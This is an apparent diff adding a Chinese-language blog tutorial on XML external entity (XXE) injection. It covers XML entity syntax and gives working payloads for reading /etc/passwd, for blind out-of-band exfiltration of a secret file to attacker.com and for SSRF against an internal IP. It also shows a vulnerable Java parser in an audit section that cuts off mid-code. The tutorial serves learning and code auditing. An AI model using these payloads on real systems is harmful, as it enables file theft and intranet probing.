@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XML 外部实体注入（XXE）漏洞基本原理 | YoSheep's 学习笔记</title><meta name="author" content="YoSheep"><meta name="copyright" content="YoSheep"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XML 外部实体注入（XXE）是一种通过在 XML 输入中引用外部实体而利用解析器缺陷的攻击方式。也就是说，当应用程序在处理 XML 文档时，如果没有正确禁用对外部实体（External Entity）的解析，就可能被构造恶意的实体引用所利用 。这种攻击可以导致敏感文件泄露、内网端口扫描、SSRF（服务器端请求伪造）、拒绝服务甚至部分场景下的远程代码执行等严重后果。简而言之，XXE 的根本原因在于">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML 外部实体注入（XXE）漏洞基本原理">
+<meta property="og:url" content="https://yosheep.github.io/posts/105b1196.html">
+<meta property="og:site_name" content="YoSheep&#39;s 学习笔记">
+<meta property="og:description" content="XML 外部实体注入（XXE）是一种通过在 XML 输入中引用外部实体而利用解析器缺陷的攻击方式。也就是说，当应用程序在处理 XML 文档时，如果没有正确禁用对外部实体（External Entity）的解析，就可能被构造恶意的实体引用所利用 。这种攻击可以导致敏感文件泄露、内网端口扫描、SSRF（服务器端请求伪造）、拒绝服务甚至部分场景下的远程代码执行等严重后果。简而言之，XXE 的根本原因在于">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yosheep.github.io/img/yeah_circle.jpg">
+<meta property="article:published_time" content="2025-08-24T11:40:38.000Z">
+<meta property="article:modified_time" content="2025-08-24T11:42:06.745Z">
+<meta property="article:author" content="YoSheep">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yosheep.github.io/img/yeah_circle.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yosheep.github.io/posts/105b1196.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: YoSheep","link":"链接: ","source":"来源: YoSheep's 学习笔记","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XML 外部实体注入（XXE）漏洞基本原理',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-08-24 19:42:06'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="YoSheep's 学习笔记" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/yeah_circle.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="YoSheep's 学习笔记"><span class="site-name">YoSheep's 学习笔记</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XML 外部实体注入（XXE）漏洞基本原理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-24T11:40:38.000Z" title="发表于 2025-08-24 19:40:38">2025-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-24T11:42:06.745Z" title="更新于 2025-08-24 19:42:06">2025-08-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XML 外部实体注入（XXE）漏洞基本原理"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/105b1196.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/105b1196.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>XML 外部实体注入（XXE）是一种通过在 XML 输入中引用外部实体而利用解析器缺陷的攻击方式。也就是说，当应用程序在处理 XML 文档时，如果没有正确禁用对外部实体（External Entity）的解析，就可能被构造恶意的实体引用所利用 。这种攻击可以导致敏感文件泄露、内网端口扫描、SSRF（服务器端请求伪造）、拒绝服务甚至部分场景下的远程代码执行等严重后果。简而言之，XXE 的根本原因在于 XML 解析器默认允许 DTD（文档类型定义）及外部实体，攻击者可借此构造引用系统或网络资源的实体，而将这些内容注入到解析过程。</p>
+<p>XXE 漏洞发生时往往是因为开发者未对 XML 输入进行严格过滤或使用弱配置的解析器。例如，缺少disallow-doctype-decl特性或允许external-general-entities解析，就会让攻击者有机可乘。一旦漏洞被触发，XML 中定义的外部实体就会被解析器读取并替换到 XML 内容中，导致文件内容返回给攻击者。实践中，许多XXE实例往往发生在允许用户上传或提交 XML 文档的位置，如配置文件上传、SOAP&#x2F;XML API 接口等场景。</p>
+<h2 id="XML核心语法：实体、DOCTYPE-与-CDATA"><a href="#XML核心语法：实体、DOCTYPE-与-CDATA" class="headerlink" title="XML核心语法：实体、DOCTYPE 与 CDATA"></a>XML核心语法：实体、DOCTYPE 与 CDATA</h2><p>理解 XXE 漏洞，需要掌握 XML 中与实体相关的基础语法和概念。XML 文档通常包含以下结构：<strong>XML 声明</strong>（可选）、<strong>DTD 文档类型定义</strong>（可选）和<strong>根元素</strong> 。DTD 用于定义文档的合法结构，包括元素声明和实体声明 。DTD 声明可以嵌入在 XML 文档内部，也可以独立保存在外部 .dtd 文件中再通过 &lt;!DOCTYPE&gt; 引用。</p>
+<p><strong>DTD（Document Type Definition，文档类型定义）</strong>：当 XML 解析器在解析文档时，如果允许加载 DTD，就会按照其中的定义去展开这些实体。正是因为 DTD 具有“引用外部资源”的能力，攻击者才有机会通过精心构造的 XML 来触发 XXE（XML External Entity，外部实体注入）漏洞，从而实现文件读取、SSRF 等攻击。</p>
+<ul>
+<li><p><strong>DOCTYPE 定义</strong>：通过 <code>&lt;!DOCTYPE 根元素 [ ... ]&gt;</code>（内部 DTD）或 <code>&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD地址&quot;&gt;</code> 引入 DTD。DTD 可以用来声明元素以及定义实体 。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">example</span> <span class="string">&quot;Hello&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span><span class="symbol">&amp;example;</span><span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>User<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>&lt;!ENTITY example &quot;Hello&quot;&gt;</code> 定义了一个内部实体 example，后文在 XML 中通过 &example; 引用。</p>
+<ul>
+<li><code>&lt;!DOCTYPE note [...]&gt;</code> 表示根元素是 <code>&lt;note&gt;</code>，并且里面包含了 **DTD (文档类型定义)**。</li>
+<li><code>&lt;!ELEMENT note (to,from,body)&gt;</code>规定 <code>&lt;note&gt;</code> 元素必须包含 <code>&lt;to&gt;</code>、<code>&lt;from&gt;</code>、<code>&lt;body&gt;</code> 三个子元素，且顺序固定。</li>
+<li><code>&lt;!ELEMENT to (#PCDATA)&gt;</code>、<code>&lt;!ELEMENT from (#PCDATA)&gt;</code>、<code>&lt;!ELEMENT body (#PCDATA)&gt;</code>表示这些元素只能包含纯文本<code>（PCDATA = Parsed Character Data）</code>。</li>
+<li><code>&lt;!ENTITY example &quot;Hello&quot;&gt;</code>定义了一个实体 example，它的值是 “Hello”。</li>
+</ul>
+</li>
+<li><p><strong>内部实体（Internal Entity）</strong>：在 DTD 内部声明的实体，格式一般为 <code>&lt;!ENTITY name &quot;value&quot;&gt;</code>。在 XML 文档中通过 &name; 来使用该实体，其作用相当于在解析时将 &name; 替换为定义的字符串内容  。也就是以上示例中的<code>&lt;!ENTITY example &quot;Hello&quot;&gt;</code>。 </p>
+</li>
+<li><p><strong>外部实体（External Entity）</strong>：使用 SYSTEM（或 PUBLIC）关键字在 DTD 中声明的实体，其值是一个外部资源的 URI。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里 <code>&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> 将<code> /etc/passwd</code> 文件的内容作为实体 <code>data</code> 的值引入文档；解析时，<code>&amp;data;</code> 会被替换为该文件的内容  。</p>
+</li>
+<li><p><strong>参数实体（Parameter Entity）</strong>：只能在 DTD 内部使用的实体，以 <code>%name</code> 格式声明和引用，用途常见于构造复杂的 DTD 或多级绕过中 。参数实体也可以是外部实体，其定义格式为 <code>&lt;!ENTITY % name &quot;value&quot;&gt;</code> 或 <code>&lt;!ENTITY % name SYSTEM &quot;URI&quot;&gt;</code>，并在 DTD 中通过 <code>%name;</code> 来引用。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/malicious.dtd&quot;</span>&gt;</span></span><br><span class="line">%ext;</span><br></pre></td></tr></table></figure>
+
+<p>使用参数实体能实现“盲注”时的多级重定向，在 XXE 攻击中经常扮演回显或数据外带的角色  。</p>
+</li>
+<li><p><strong>CDATA 部分</strong>：CDATA（不解析的字符数据）用于包含不应被 XML 解析器处理的原始文本数据。CDATA 区段以 <code>&lt;![CDATA[</code> 开始，以 <code>]]&gt;</code> 结束，区段内的 <code>&lt;</code>、<code>&amp;</code> 等字符都被视作普通文本 。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  &lt;![CDATA[</span><br><span class="line">    &lt;script&gt;alert(&quot;Hello World!&quot;);&lt;/script&gt;</span><br><span class="line">  ]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这段中，<code>&lt;![CDATA[</code> 标记之间的所有内容会被解析器忽略解析（不视为标签），直到碰到 <code>]]&gt;</code> 为止 ，例如以上场景解析器也不会把 <code>&lt;script&gt; </code>当成标签，而是当成普通字符串，js脚本也不会被执行。</p>
+</li>
+<li><p><strong>实体引用</strong>：普通实体和参数实体在 XML 文档中分别通过 &name; 和 %name; 引用。在解析过程中，解析器会将实体引用替换为其定义的值  。例如，若 DTD 中定义了 <code>&lt;!ENTITY foo &quot;bar&quot;&gt;</code>，那么 XML 文档中出现的 &foo; 就会被解析成 “bar”  。</p>
+</li>
+</ul>
+<h2 id="XXE-攻击示例"><a href="#XXE-攻击示例" class="headerlink" title="XXE 攻击示例"></a>XXE 攻击示例</h2><h3 id="基本-XXE（文件读取）"><a href="#基本-XXE（文件读取）" class="headerlink" title="基本 XXE（文件读取）"></a>基本 XXE（文件读取）</h3><p>攻击者在 XML 中声明一个指向本地敏感文件的外部实体，然后引用它。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">user</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">info</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> 定义了一个名为 data 的外部实体，其值为 <code>/etc/passwd</code> 文件的内容。解析该 XML 时，&data; 会被替换为 &#x2F;etc&#x2F;passwd 的实际内容并返回给攻击者 。</p>
+<h3 id="盲注-XXE（Out-of-Band-渠道）"><a href="#盲注-XXE（Out-of-Band-渠道）" class="headerlink" title="盲注 XXE（Out-of-Band 渠道）"></a>盲注 XXE（Out-of-Band 渠道）</h3><p>在无法通过响应直接看到输出时，可以利用参数实体构造一个“带外信道”。通常做法是在外部 DTD 中定义两个实体：一个读取敏感内容，一个通过网络协议将内容发送到攻击者控制的服务器。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 攻击者在其服务器上写文件 malicious.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/app/secret.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#x27;http://attacker.com/collect?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述 malicious.dtd 文件先定义了参数实体 %file 读取 &#x2F;home&#x2F;app&#x2F;secret.txt，然后定义了实体 %send（其中编码后的 % 为 <code>&amp;#37;</code>）来生成一个新的通用实体 %exfil，该实体会触发对攻击者服务器的 HTTP 请求并将 %file 内容作为参数发送 。攻击者在请求中使用以下 XXE 负载：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/malicious.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">  %exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于以上malicious.dtd的写法，为什么不能写成以下的形式呢？</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/app/secret.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">exfil</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://attacker.com/collect?data=%file;&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是因为在 DTD 里面直接写 %exfil 和把它包在另一个实体里再展开，涉及到 XML 参数实体解析的规则。在参数实体声明里（<code>&lt;!ENTITY %exfil SYSTEM &quot;...&quot;&gt;</code>），引用 <code>%file</code>; 是不会被展开的，因为参数实体的值不会在另一个实体声明里进行替换。也就是说，<code>http://attacker.com/collect?data=%file;</code> 不会自动把 %file; 展开成文件内容，而是原样保留。这样就收不到<code>/home/app/secret.txt</code>的内容，只能看到字面量<code> %file;</code>。</p>
+<p>而原本的两段式写法，先定义 %send，它的值里包含了另一个实体声明：<code>&lt;!ENTITY % exfil SYSTEM &#39;http://attacker.com/collect?data=%file;&#39;&gt;</code>(这里的 &#37; 是 % 的转义，否则 XML 解析时会报错)，当在主 XML 里写 <code>%send; </code>时，解析器会把 <code>%send</code> 的值插进来，相当于“动态生成”了一个新的参数实体 <code>%exfil</code>，而这个 <code>%exfil</code> 里对 <code>%file;</code> 的引用才会被解析。</p>
+<h3 id="基于外部协议（SSRF）利用"><a href="#基于外部协议（SSRF）利用" class="headerlink" title="基于外部协议（SSRF）利用"></a>基于外部协议（SSRF）利用</h3><p>当外部实体 URI 使用 HTTP&#x2F;FTP 等协议时，XXE 实际上变成了对指定 URL 的请求，也就是一种 <strong>SSRF</strong>（服务器端请求伪造）攻击方式  。例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.0.100:8080/secret-endpoint&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果 192.168.0.100 是目标内网中的某台主机，这个负载会使解析器向内网地址 <code>http://192.168.0.100:8080/secret-endpoint</code> 发起请求。通过 file:&#x2F;&#x2F; 读取本地文件或通过 http:&#x2F;&#x2F; 发起请求，本质上都与 SSRF 类似。同样地，可以把目标换成内部 IP 或使用爆破方式扫描内网地址。这种方式已被用来扫描内网服务和敏感接口，并在某些场景下进一步获取内部资源。</p>
+<h3 id="其他利用方式"><a href="#其他利用方式" class="headerlink" title="其他利用方式"></a>其他利用方式</h3><p>XXE 还可以与文件上传场景（如 SVG 图片）结合利用，或者通过 jar:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;、ldap:&#x2F;&#x2F; 等协议进行更复杂的攻击（如利用 jar: 协议提取归档内容）  。总体而言，XXE 的利用方式多种多样，但核心原理都是通过实体声明来触发对文件系统或网络资源的访问。</p>
+<h2 id="代码审计：识别XXE漏洞"><a href="#代码审计：识别XXE漏洞" class="headerlink" title="代码审计：识别XXE漏洞"></a>代码审计：识别XXE漏洞</h2><p>在代码审计过程中，识别 XXE 常见的检查点主要集中在 XML 解析相关的 API 和配置上。各语言常用的 XML 解析库如果使用不当，都可能引入 XXE 风险。以下是几个典型语言的检查思路和示例：</p>
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>常见的 XML 解析类包括 DocumentBuilderFactory&#x2F;DocumentBuilder、SAXParserFactory&#x2F;SAXParser、TransformerFactory、SchemaFactory、org.xml.sax.XMLReader、org.dom4j.io.SAXReader、JDOM SAXBuilder、javax.xml.bind.Unmarshaller 等  。审计时需要检查是否在实例化解析器后关闭了 DTD 和外部实体解析。</p>
+<p>存在漏洞的情况：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXEVulnerable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="comment">// ❌ 默认情况下未禁用外部实体</span></span><br><span class="line">        <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">        <span class="type">Document</span> <span 